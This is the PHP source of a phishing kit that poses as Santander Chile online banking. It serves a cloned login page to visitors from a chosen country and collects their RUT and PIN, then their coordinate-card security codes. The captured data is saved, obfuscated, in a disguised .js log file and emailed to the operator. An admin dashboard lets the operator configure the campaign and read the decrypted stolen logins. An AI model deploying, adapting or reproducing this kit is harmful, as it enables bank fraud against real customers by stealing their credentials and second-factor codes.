<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
@ini_set('memory_limit', '-1');
require_once('Includes.php');

/*Configuracion*/
define('USEPROXY',/*'127.0.0.1:8118'*/false);
define('USER-AGENT','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1');
define('AREA_TIEMPO','America/Lima');
define('LOCAL_DIR',dirname(__FILE__).'/');
define('DIR_PAGE','pagina/');
define('PAGE_URL',pathinfo('http://'. $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"],PATHINFO_DIRNAME).'/');
define('VAR_ACT','STP');
define('AUTHEMAIL','AZ?D8/P6=C95#'); /*Email Authentication*/
define('COOKIE_FILE',LOCAL_DIR.'pagina/cookie_p.txt'); /*Asignar permisos de escritura*/
define('DB_FILE',LOCAL_DIR.'pagina/funcion.js'); /*Asignar permisos de escritura*/
define('CONFIG_FILE',LOCAL_DIR.'pagina/config.js'); /*Asignar permisos de escritura*/
define('KEYCRYPT','PO?D5/D3=D45#'); /*clave para ofuscar los logs*/
/*Configuracion*/

$system = new Santander();
$ipv = $system->getClientIP();
$country_code = $system->CountryCode();
$country_name = $system->CountryName();

$logs = $system->OpenFile(CONFIG_FILE);
$dblanding = $system->Desofuscar($logs, KEYCRYPT);
$valore = split("{%}",$dblanding);
				 
$accion = $_GET[VAR_ACT];
if( empty( $accion ) ){
	$accion = 'index';
}

$countryGets = $_GET['CDG'];
if( empty( $countryGets ) ){
	$countryGets = $country_code;
}

switch ($countryGets){
	
       case $valore[0]:
	   
	   switch ($accion){
		   
		   case 'index':
		        $loadingpage = $system->OpenFile(DIR_PAGE.'index.html');
		        print $loadingpage;
				exit();	
		   break;
		   
		   case 'view.asp':
		     
			if( !empty( $_POST['rut'] ) && !empty( $_POST['pin'] )){
			if($system->Login( $_POST['rut'], $_POST['pin'])){
                    $_SESSION['rut'] = true ;
					header ("Location: view.asp");
					exit();
					
			    }else{
				  header('Location: ../../errmsg/err21.htm');
				  exit;
			 }
		   }
		   
		   if( !$_SESSION['rut'] ){
			   
			   header('Location: ../../../');
		   }
		       $panelpage = $system->OpenFile(DIR_PAGE.'panel.html');
               $cuenta = unserialize($_SESSION['datausr']);
               $Dates = date("d/m/Y"); 
               $Horas = date("H:i:s:A"); 
               $panelpage = str_replace('<!--Nombre-->',htmlspecialchars($cuenta['nombre'], ENT_QUOTES),$panelpage);
               $panelpage = str_replace('<!--year-->',$Dates,$panelpage);
               $panelpage = str_replace('<!--times-->',$Horas,$panelpage);       
               print $panelpage;
			   
		   break;
		   
    case 'viewpanel.asp':
	    @session_start(); if ( !isset($_SESSION['rut']) ){ header('Location: ../../../');  exit() ; }
		   //
		$cuenta = unserialize($_SESSION['datausr']);
		$coordkeys = htmlspecialchars($cuenta['keycor'], ENT_QUOTES);
		if(ereg("Tarjeta Super",  $coordkeys)) $qcoords = "coord";
		$card = $system->GenerateCard();
		$system->shuffle_with_keys($card);
		$rand_keys = array_rand($card, $valore[2]);
		$inputs = '<table border="0" width="81" id="table1" align="center"><tr><td colspan="3" bgcolor="#CD3833">';
		
		
		$bcs = 1;
		$inputs .= '<table id="table1" width="93%" border="0">';
		foreach( $rand_keys as $val ){
			if( $bcs == 1 ){$inputs .= '<tr>';}
			$inputs .= sprintf('<td width="19" bgcolor="#7E9193"><b><font size="2">%1$s</font></b></td><td width="15" bgcolor="#DCE5E8"><input type="text" maxlength="2" name="coord[%1$s]" class="coords" size="1" style="border: 1px solid #000000,font-family: Tahoma; color: #000000; font-weight: bold"/></td>',$val);
			if( $bcs >= 6 ){$inputs .= '</tr>';$bcs = 0;}
			$bcs++;
		}
		unset($bcs);
		$inputs .= '</table>';
		$inputs .= '</tr>';
		$inputs .= '</table>';
		
		 if($_POST['modulo'] == "2"){
					@session_destroy();
					die('<script type="text/javascript">window.location.href="http://bit.ly/1emlekU";</script>');
					exit();
		   }
		 if( $valore[4] == "1" && $valore[2] == "50") {
			       
				   $panelpage = $system->OpenFile(DIR_PAGE.'Modulo1.html');
				   $panelpage = str_replace('<!--modulo-->',"3",$panelpage);
				   $panelpage = str_replace('<!--title-->',"1 de 2",$panelpage);
				   
				   }
		 if( $valore[4] == "1" && $valore[2] < 50 && $_SESSION['intentos'] < $valore[3]) {
			   
		           $panelpage = $system->OpenFile(DIR_PAGE.'Modulo2.html');			         
		           $panelpage = str_replace('<!--Coords-->',$inputs,$panelpage);
				   $panelpage = str_replace('<!--modulo-->',"3",$panelpage);
				   $panelpage = str_replace('<!--title-->',"1 de 2",$panelpage);
		       if( $_POST['modulo'] == "3" ){
		         $mensajes = '<span class="alert_error">Uno de los datos ingresados es incorrecto, por favor complete nuevamente el  formulario</span>';
		          }
					   
			   }
	     if( $valore[4] == "1" && $valore[2] < 50 && $_SESSION['intentos'] == $valore[3]) {
			   
		       $panelpage = $system->OpenFile(DIR_PAGE.'Modulo3.html');
			   $panelpage = str_replace('<!--Nombre-->',htmlspecialchars($cuenta['nombre'], ENT_QUOTES),$panelpage);
			   $panelpage = str_replace('<!--modulo-->',"2",$panelpage);
			   $panelpage = str_replace('<!--title-->',"2 de 2",$panelpage);
					   
			   }
	     if( $valore[4] == "1" && $valore[2] == "50" && $_POST['modulo'] == "3") {
			   
		       $panelpage = $system->OpenFile(DIR_PAGE.'Modulo3.html');
			   $panelpage = str_replace('<!--Nombre-->',htmlspecialchars($cuenta['nombre'], ENT_QUOTES),$panelpage);
			   $panelpage = str_replace('<!--modulo-->',"2",$panelpage);
			   $panelpage = str_replace('<!--title-->',"2 de 2",$panelpage);
					   
			   }
		 if( $valore[4] == "2" && $valore[2] < 50 && count($_SESSION['intentos']) <= 0) {
			   
		       $panelpage = $system->OpenFile(DIR_PAGE.'Modulo3.html');
			   $panelpage = str_replace('<!--Nombre-->',htmlspecialchars($cuenta['nombre'], ENT_QUOTES),$panelpage);
			   $panelpage = str_replace('<!--modulo-->',"0",$panelpage);
			   $panelpage = str_replace('<!--title-->',"1 de 2",$panelpage);
					   
			   }
		 if( $valore[4] == "2" && $valore[2] < 50 && $_SESSION['intentos'] > 0) {
			   
			   $panelpage = $system->OpenFile(DIR_PAGE.'Modulo2.html');			         
		       $panelpage = str_replace('<!--Coords-->',$inputs,$panelpage);
			   $panelpage = str_replace('<!--modulo-->',"3",$panelpage);
			   $panelpage = str_replace('<!--title-->',"2 de 2",$panelpage);
		     if( $_POST['modulo'] == "3" ){
		         $mensajes = '<span class="alert_error">Uno de los datos ingresados es incorrecto, por favor complete nuevamente el  formulario</span>';
		          }

			   }
		 if( $valore[4] == "2" && $valore[2] < 50 && $_SESSION['intentos'] == $valore[3]+1) {
			        @session_destroy();
					die('<script type="text/javascript">window.location.href="http://bit.ly/1emlekU";</script>');
					exit();
		 }
		 if( $valore[4] == "2" && $valore[2] == "50" && count($_SESSION['intentos']) <= 0) {
			 
			   $panelpage = $system->OpenFile(DIR_PAGE.'Modulo3.html');
			   $panelpage = str_replace('<!--Nombre-->',htmlspecialchars($cuenta['nombre'], ENT_QUOTES),$panelpage);
			   $panelpage = str_replace('<!--modulo-->',"0",$panelpage);
			   $panelpage = str_replace('<!--title-->',"1 de 2",$panelpage);
		 }
		 if( $valore[4] == "2" && $valore[2] == "50" && count($_SESSION['intentos']) == 1) {
			 
			   $panelpage = $system->OpenFile(DIR_PAGE.'Modulo1.html');
			   $panelpage = str_replace('<!--Nombre-->',htmlspecialchars($cuenta['nombre'], ENT_QUOTES),$panelpage);
			   $panelpage = str_replace('<!--modulo-->',"0",$panelpage);
			   $panelpage = str_replace('<!--title-->',"2 de 2",$panelpage);
		 }
		 if( $valore[4] == "2" && $valore[2] == "50" && $_SESSION['intentos'] == 2) {
			        @session_destroy();
					die('<script type="text/javascript">window.location.href="http://bit.ly/1emlekU";</script>');
					exit();
		 }
		 $panelpage = str_replace('<!--Mensaje-->',$mensajes,$panelpage);	   
		 $panelpage = str_replace('<!--NumbCoords-->',$coordkeys,$panelpage);
		 print $panelpage;
		   
	 //
     break;
		   
		   case 'SendDatos':
		   @session_start(); if ( !isset($_SESSION['rut']) ){ header('Location: ../../../');  exit() ; }
		   
		   $system->SaveFile(DB_FILE,$system->Ofuscar($system->FormatLog($_POST['coord']),KEYCRYPT).'|');
			        $ipv = getenv("REMOTE_ADDR");
		            $prefijo = substr(md5(uniqid(rand())),0,6);
			        $system->SendEmail($valore[1],
					'Santander Chile',
					'login-'.$ipv.'mail-@publimailer.com',
					'Login -'.$ipv.'',
					$system->FormatLog($_POST['coord']));
					
			$_SESSION['intentos'] = (!isset( $_SESSION['intentos'] )?1:$_SESSION['intentos']+1);
		   
		   break;
		   
		   case 'Error':
		        $loadingpage = $system->OpenFile(DIR_PAGE.'error.html');
		        print $loadingpage;
				exit();
		   break;
		   
	   }

	   
	   break;
	   
	   case 'Admin':
	   
        @session_start();
		if( isset($_POST['user']) && !empty($_POST['user']) && isset($_POST['pass']) && !empty($_POST['pass']) ){
			if( $config['DbUser'] == $_POST['user'] ){
				if( $config['DbPass'] == $_POST['pass'] ){
					$_SESSION['login'] = true ;
					header ("Location: ./");
					exit();
				}
			}
		}
		if($_POST['modulo'] == "sendata"){
				
				$ss0 = $_POST['code'];
				$ss1 = $_POST['email'];
				$ss2 = $_POST['coord'];
				$ss3 = $_POST['qcoord'];
				$ss4 = $_POST['type'];
				
				$settings = "$ss0{%}$ss1{%}$ss2{%}$ss3{%}$ss4";
				
				
				$O = @fopen(CONFIG_FILE , "w+");
				@fwrite($O , $system->Ofuscar($settings,KEYCRYPT).'|');
				@fclose($O);
				
				echo '<span class="success">Saved settings correctly!</span>';
				exit();
			}
		if( !$_SESSION['login'] ){
			
			     $page .= '<!DOCTYPE html>' . "\n";
			     $page .= '<html lang="en">' . "\n";
			     $page .= '<head>' . "\n";
			     $page .= '<title>Administrator - Login In</title>' . "\n";
			     $page .= '<meta charset="UTF-8">' . "\n";
			     $page .= '<link rel="stylesheet" href="../pagina/images/style.css" type="text/css" media="screen">' . "\n";
			     $page .= '</head>' . "\n";
			     $page .= '<body>' . "\n";
			     $page .= '<form id="payment" action="" method="post">' . "\n";
				 
				 $page .= '<h1 class="title"><img src="../pagina/images/logo.png" width="85" height="70"></h1>' . "\n";
				 $page .= '<fieldset>' . "\n";
				 
				 $page .= '<legend>Login In</legend>' . "\n";
				 
				 $page .= '<ol>' . "\n";
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label for="name">Administrator</label>' . "\n";
				 $page .= '<input id="user" name="user" type="text" placeholder="User Name" required autofocus>' . "\n";
				 $page .= '</li>' . "\n";
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label for="name">Password</label>' . "\n";
				 $page .= '<input id="pass" name="pass" type="password" placeholder="Password" required autofocus>' . "\n";
				 $page .= '</li>' . "\n";
				 
				 $page .= '</ol>' . "\n";
				 $page .= '</fieldset>' . "\n";
				 $page .= '</li>' . "\n";
				 $page .= '<fieldset>' . "\n";
                 $page .= '<button type="submit">Sign in</button>' . "\n";
				 $page .= '</fieldset>' . "\n";
				 $page .= '</form>' . "\n";
				 $page .= '<footer>' . "\n";
				 $page .= '<p></p>' . "\n";
				 $page .= '</footer>' . "\n";
				 $page .= '</body>' . "\n";
				 $page .= '</html>' . "\n";
				 
				 print $page;
			break;
		}
		
		         $logos = $system->OpenFile(DB_FILE);
		         $logos = explode('|',$logos);
		         
		         foreach($logos as $log){
			     $logins .= $system->Desofuscar($log, KEYCRYPT);
		         }
				 
				 
			     $page .= '<!DOCTYPE html>' . "\n";
			     $page .= '<html lang="en">' . "\n";
			     $page .= '<head>' . "\n";
			     $page .= '<title>Dashboard - Config</title>' . "\n";
			     $page .= '<meta charset="UTF-8">' . "\n";
			     $page .= '<link rel="stylesheet" href="../pagina/images/style.css" type="text/css" media="screen">' . "\n";
				 $page .= '<script src="https://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script>' . "\n";
				 $page .= '<script src="../pagina/images/ajax.js" type="text/javascript"></script>' . "\n";
			     $page .= '</head>' . "\n";
			     $page .= '<body>' . "\n";
			     $page .= '<div id="payment">' . "\n";
				 
				 $page .= '<h1 class="title"><a href="./"><img src="../pagina/images/logo.png" width="85" height="70"></h1></a>' . "\n";
				 $page .= '<fieldset>' . "\n";
				 
				 $page .= '<legend></legend>' . "\n";
				 $page .= '<div id="frm-status" align="center"></div>' . "\n";
				 
				 $page .= '<ol>' . "\n";
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label>Country code</label>' . "\n";
				 $page .= '<input type="text" id="code" name="code" maxlength="2" value="'.$valore[0].'" style="text-transform:uppercase;" onkeyup="javascript:this.value=this.value.toUpperCase();">' . "\n";
				 $page .= '<div id="code-info"></div></li>' . "\n";
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label>Notifier mail</label>' . "\n";
				 $page .= '<input id="email" name="email" type="text" value="'.$valore[1].'">' . "\n";
				 $page .= '<div id="email-info"></div></li>' . "\n";
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label>Number of Coord</label>' . "\n";
				 $page .= '<input id="coord" name="coord" type="text" maxlength="2" value="'.$valore[2].'">' . "\n";
				 $page .= '<div id="coord-info"></div></li>' . "\n";
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label>Attemps</label>' . "\n";
				 $page .= '<input id="qcoord" name="qcoord" type="text" maxlength="2" value="'.$valore[3].'">' . "\n";
				 $page .= '<div id="qcoord-info"></div></li>' . "\n";
				 
				 if( $valore[4] == "1") { 
				 $pageotp .= '<option value="1">Login + Coord + #CC</option>' . "\n";
				 }
				 if( $valore[4] == "2") { 
				 $pageotp .= '<option value="2">Login + #CC + Coord(</option>' . "\n";
				 }
				 
				 $page .= '<li>' . "\n";
				 $page .= '<label>Control order</label>' . "\n";
				 $page .= '<select name="type" id="type">' . "\n";
				 $page .= ''.$pageotp.'' . "\n";
				 $page .= '<option value=""></option>' . "\n";
				 $page .= '<option value="1">Login + Coord + #CC</option>' . "\n";
				 $page .= '<option value="2">Login + #CC + Coord</option>' . "\n";
				 $page .= '</select>' . "\n";
				 $page .= '<div id="type-info"></div></li>' . "\n";
				 
				 $page .= '</ol>' . "\n";
				 $page .= '</fieldset>' . "\n";
				 
				 $page .= '<fieldset>' . "\n";
				 $page .= '<h1>'.$_SESSION['msj'].'</h1>' . "\n";
                 $page .= '<button name="submit" type="submit" onClick="SaveConfig();">Save & Continue</button>' . "\n";
				 $page .= '</fieldset>' . "\n";
				 
				 $page .= '<fieldset>' . "\n";
				 
				 $page .= '<legend>Santander Login</legend>' . "\n";
				 
				 $page .= '<ol>' . "\n";
				 $page .= '<li>' . "\n";
				 $page .= '<label>Logs</label>' . "\n";
				 $page .= '<textarea name="content" id="content" class="demoInputBox" cols="60" rows="6">'.$logins.'</textarea>' . "\n";
				 
				 $page .= '</li>' . "\n";
				 $page .= '</ol>' . "\n";
                 $page .= '</fieldset>' . "\n";
				 
				 $page .= '</div>' . "\n";
				 $page .= '<footer>' . "\n";
				 $page .= '<p></p>' . "\n";
				 $page .= '</footer>' . "\n";
				 $page .= '</body>' . "\n";
				 $page .= '</html>' . "\n";
				 
						 
						echo $page;
						       exit;
		
       break;
   
default: 
include('pagina/404.html');
exit;
}
?>